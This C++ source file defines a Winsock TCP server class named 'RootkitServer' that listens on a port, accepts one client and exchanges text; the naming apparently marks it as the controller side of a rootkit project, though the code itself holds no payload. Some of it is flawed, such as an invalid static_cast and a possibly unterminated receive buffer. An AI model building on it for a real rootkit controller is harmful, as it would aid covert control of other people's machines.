#include "Server.h"
Server::WrapWSA::WrapWSA() {
	WSAData wsaData;

	if (WSAStartup(MAKEWORD(2, 2), &wsaData)) {
		throw std::exception("Error on starting sockets");
	}

}
void Server::WrapWSA::cleanup() {
	std::cout << "WSACleanup called\n";
	WSACleanup();
}
int Server::WrapWSA::getError() {
	return WSAGetLastError();
}

bool Server::RootkitServer::init_listen_bind() {
	sockaddr_in addr;
	addr.sin_addr.s_addr = INADDR_ANY;
	addr.sin_family = AF_INET;
	addr.sin_port = htons(port_);

	int status = bind(socket_, static_cast<sockaddr*>(&addr), sizeof(addr));

	if (status != 0)
		return false;

	status = listen(socket_, 1);

	if (status != 0)
		return false;

	return true;

}

Server::RootkitServer::RootkitServer(): port_(Server::SERVER_PORT){
	wsa_=Server::WrapWSA();
	socket_ = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);


	if (socket_ == INVALID_SOCKET)
		throw std::exception("Couldn't open socket");


	bool status = init_listen_bind();


	if (!status)
		throw std::exception("couldn't listen/bind to port");


}

Server::RootkitServer::~RootkitServer() {

	std::cout << "closing socket.\n";

	closesocket(socket_);
	closesocket(client_socket_);
	wsa_.cleanup();
}

bool Server::RootkitServer::Accept() {

	client_socket_ = INVALID_SOCKET;

	// Accept a client socket
	client_socket_ = accept(socket_, NULL, NULL);

	if (client_socket_ == INVALID_SOCKET)
		return false;

	return true;
}

bool Server::RootkitServer::ReceiveText(std::string& text) {

	char recived_buffer[MAX_PACKET_SIZE]{0};

	int bytes_recived = recv(client_socket_, recived_buffer, MAX_PACKET_SIZE, 0);

	if (bytes_recived == SOCKET_ERROR) {
		std::cout << "SOCKET ERROR! errorcode:";
		std::cout << wsa_.getError() << "\n";
		return false;
	}

	text += recived_buffer;

	return text.size();
}


bool Server::RootkitServer::SendText(std::string& text) {

	int bytes_recived = send(client_socket_, text.c_str(), text.size(), 0);

	if (bytes_recived == SOCKET_ERROR) {
		std::cout << "SOCKET ERROR! errorcode:";
		std::cout << wsa_.getError() << "\n";
		return false;
	}

	return true;
}

